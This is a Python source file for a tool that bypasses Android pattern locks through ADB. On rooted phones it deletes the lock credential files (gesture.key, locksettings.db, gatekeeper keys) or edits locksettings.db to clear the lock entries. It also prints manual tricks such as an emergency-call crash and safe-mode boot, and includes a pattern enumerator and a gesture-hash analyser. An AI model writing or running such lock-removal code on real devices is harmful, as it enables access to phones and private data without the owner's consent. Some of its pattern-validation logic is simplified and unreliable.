"""
Pattern Bypass - Methods to bypass pattern locks on Android devices
"""

import os
import sqlite3
import hashlib
from pathlib import Path
from adb_manager import ADBManager

class PatternBypass:
    def __init__(self):
        self.adb = ADBManager()
        self.methods = [
            self._method_adb_delete,
            self._method_sqlite_reset,
            self._method_recovery_mode,
            self._method_emergency_call,
            self._method_safe_mode,
        ]
    
    def attempt_bypass(self):
        """Try all pattern bypass methods"""
        print("\n🎯 ATTEMPTING PATTERN BYPASS")
        print("=" * 60)
        
        # Check if device is connected
        if not self.adb.check_adb_installed():
            print("ADB not available")
            return False
        
        # Check lock type
        print("Verifying lock type...")
        lock_type = self._check_lock_type()
        
        if lock_type != 'pattern':
            print(f"Device has {lock_type} lock, not pattern")
            return False
        
        print("✓ Device has pattern lock")
        
        # Try methods in order
        for i, method in enumerate(self.methods, 1):
            print(f"\n[{i}/{len(self.methods)}] Trying method...")
            if method():
                print("\n✅ Pattern bypass successful!")
                return True
        
        print("\n❌ All pattern bypass methods failed")
        return False
    
    def _check_lock_type(self):
        """Check what type of lock is active"""
        # Try to find pattern files
        files_to_check = [
            '/data/system/gesture.key',
            '/data/system/locksettings.db',
            '/data/system/password.key',
        ]
        
        for file in files_to_check:
            result = self.adb.execute_command(['shell', 'ls', file])
            if result['success'] and 'No such file' not in result['error']:
                if 'gesture.key' in file:
                    return 'pattern'
                elif 'password.key' in file:
                    return 'password'
        
        return 'unknown'
    
    def _method_adb_delete(self):
        """Method 1: Delete pattern files via ADB (requires root)"""
        print("Method 1: Deleting pattern files (requires root)")
        
        # Check root
        if not self.adb.is_device_rooted():
            print("  ✗ Device not rooted")
            return False
        
        files_to_delete = [
            '/data/system/gesture.key',
            '/data/system/locksettings.db',
            '/data/system/locksettings.db-wal',
            '/data/system/locksettings.db-shm',
            '/data/system/gatekeeper.pattern.key',
            '/data/system/gatekeeper.password.key',
        ]
        
        success = True
        for file in files_to_delete:
            result = self.adb.execute_command(['shell', 'rm', '-f', file])
            if result['success']:
                print(f"  ✓ Deleted: {file}")
            else:
                print(f"  ✗ Failed: {file}")
                success = False
        
        if success:
            # Reboot to apply changes
            print("  Rebooting device...")
            self.adb.reboot_device()
            return True
        
        return False
    
    def _method_sqlite_reset(self):
        """Method 2: Reset locksettings via SQLite (requires root)"""
        print("Method 2: SQLite database reset (requires root)")
        
        if not self.adb.is_device_rooted():
            print("  ✗ Device not rooted")
            return False
        
        # Pull the locksettings database
        temp_dir = Path("/tmp/android_recovery")
        temp_dir.mkdir(exist_ok=True)
        db_path = temp_dir / "locksettings.db"
        
        print(f"  Pulling database...")
        if not self.adb.pull_file('/data/system/locksettings.db', str(db_path)):
            print("  ✗ Failed to pull database")
            return False
        
        try:
            # Modify database
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            
            # Clear locksettings
            tables = ['locksettings', 'secure', 'system']
            for table in tables:
                try:
                    cursor.execute(f"DELETE FROM {table} WHERE name LIKE 'lock%'")
                    cursor.execute(f"DELETE FROM {table} WHERE name LIKE 'lockscreen%'")
                    print(f"  ✓ Cleared {table} table")
                except:
                    print(f"  ✗ Failed to clear {table}")
            
            conn.commit()
            conn.close()
            
            # Push back modified database
            print("  Pushing modified database...")
            if self.adb.push_file(str(db_path), '/data/system/locksettings.db'):
                # Set correct permissions
                self.adb.execute_command(['shell', 'chmod', '600', '/data/system/locksettings.db'])
                self.adb.execute_command(['shell', 'chown', 'system:system', '/data/system/locksettings.db'])
                
                print("  Rebooting device...")
                self.adb.reboot_device()
                return True
        
        except Exception as e:
            print(f"  ✗ SQLite error: {e}")
        
        return False
    
    def _method_recovery_mode(self):
        """Method 3: Clear data via recovery mode"""
        print("Method 3: Recovery mode wipe")
        
        print("  This will wipe cache partition (not user data)")
        confirm = input("  Continue? (y/n): ").lower()
        
        if confirm != 'y':
            print("  ✗ Cancelled")
            return False
        
        # Reboot to recovery
        print("  Rebooting to recovery...")
        if not self.adb.reboot_device('recovery'):
            print("  ✗ Failed to reboot to recovery")
            return False
        
        print("\n  MANUAL STEPS REQUIRED:")
        print("  1. Wait for device to boot into recovery")
        print("  2. Use volume keys to select 'Wipe cache partition'")
        print("  3. Press power button to confirm")
        print("  4. Select 'Reboot system now'")
        print("\n  Does this clear the pattern? (y/n): ", end='')
        
        result = input().lower()
        return result == 'y'
    
    def _method_emergency_call(self):
        """Method 4: Emergency call bypass (old Android versions)"""
        print("Method 4: Emergency call bypass")
        
        print("  This works on some older Android versions (4.0-7.0)")
        print("  Steps to try:")
        print("  1. On lock screen, tap Emergency Call")
        print("  2. Dial any emergency number (like 112)")
        print("  3. Quickly press back button")
        print("  4. Repeat 10-20 times quickly")
        print("  5. Sometimes this crashes lock screen")
        
        result = input("\n  Did this work? (y/n): ").lower()
        return result == 'y'
    
    def _method_safe_mode(self):
        """Method 5: Safe mode bypass"""
        print("Method 5: Safe mode bypass")
        
        print("  For some devices, booting in safe mode disables lock")
        print("  Steps:")
        print("  1. Power off device")
        print("  2. Press and hold power button")
        print("  3. When logo appears, press and hold volume down")
        print("  4. Keep holding until boot completes")
        print("  5. Check if lock is disabled")
        
        result = input("\n  Did safe mode disable lock? (y/n): ").lower()
        return result == 'y'
    
    def brute_force_pattern(self, max_length=9):
        """
        Attempt to brute force pattern (theoretical - for research only)
        WARNING: This is extremely slow and impractical
        """
        print("\n⚠️  PATTERN BRUTE FORCE (RESEARCH ONLY)")
        print("This is for educational purposes!")
        
        # Pattern possibilities (3x3 grid)
        positions = list(range(1, 10))
        
        # Generate all possible patterns
        import itertools
        
        total_attempts = 0
        for length in range(4, max_length + 1):  # Patterns are 4-9 points
            for pattern in itertools.permutations(positions, length):
                # Check if pattern is valid (adjacent points)
                if self._is_valid_pattern(pattern):
                    total_attempts += 1
                    
                    if total_attempts % 1000 == 0:
                        print(f"  Tested {total_attempts} patterns...")
                    
                    # In reality, we would need to test on device
                    # This is just to demonstrate the scale
        
        print(f"\nTotal possible patterns up to {max_length} points: {total_attempts}")
        print("Actual brute force would take years!")
        
        return False
    
    def _is_valid_pattern(self, pattern):
        """Check if pattern follows Android's rules"""
        # Convert to 0-indexed for grid
        grid = [
            [1, 2, 3],
            [4, 5, 6],
            [7, 8, 9]
        ]
        
        visited = set()
        
        for i in range(len(pattern) - 1):
            current = pattern[i]
            next_point = pattern[i + 1]
            
            if next_point in visited:
                return False
            
            # Check if move is valid (adjacent or through visited point)
            if not self._is_valid_move(current, next_point, visited):
                return False
            
            visited.add(current)
        
        return True
    
    def _is_valid_move(self, from_pos, to_pos, visited):
        """Check if move between two points is valid"""
        # Mapping of points and their neighbors
        neighbors = {
            1: [2, 4, 5],
            2: [1, 3, 4, 5, 6],
            3: [2, 5, 6],
            4: [1, 2, 5, 7, 8],
            5: [1, 2, 3, 4, 6, 7, 8, 9],
            6: [2, 3, 5, 8, 9],
            7: [4, 5, 8],
            8: [4, 5, 6, 7, 9],
            9: [5, 6, 8]
        }
        
        # Direct neighbor is always valid
        if to_pos in neighbors.get(from_pos, []):
            return True
        
        # Check if moving through visited point
        # This is simplified - actual Android logic is more complex
        return False
    
    def analyze_pattern_file(self, gesture_key_file):
        """
        Analyze a captured gesture.key file
        This is for forensic analysis of pattern hashes
        """
        if not os.path.exists(gesture_key_file):
            print(f"File not found: {gesture_key_file}")
            return None
        
        with open(gesture_key_file, 'rb') as f:
            data = f.read()
        
        print(f"\n🔍 Analyzing pattern hash file")
        print(f"File size: {len(data)} bytes")
        print(f"Hash (SHA1): {hashlib.sha1(data).hexdigest()}")
        
        # Pattern hash is usually SHA1 of pattern points
        # Format depends on Android version
        
        if len(data) == 20:  # SHA1 hash
            print("Format: SHA1 hash (Android 4.0-9.0)")
            print(f"Raw hash: {data.hex()}")
            
            # Try to find pattern from hash (this is just demonstration)
            print("\nNote: To crack this hash, you would need:")
            print("1. All possible pattern combinations")
            print("2. Android's pattern encoding algorithm")
            print("3. Massive computational power")
            print("\nFor Android 9+, pattern uses 10000 PBKDF2 iterations")
            print("Making brute force practically impossible")
        
        elif len(data) > 20:
            print(f"Format: Unknown (size: {len(data)} bytes)")
            print(f"First 20 bytes: {data[:20].hex()}")
        
        return data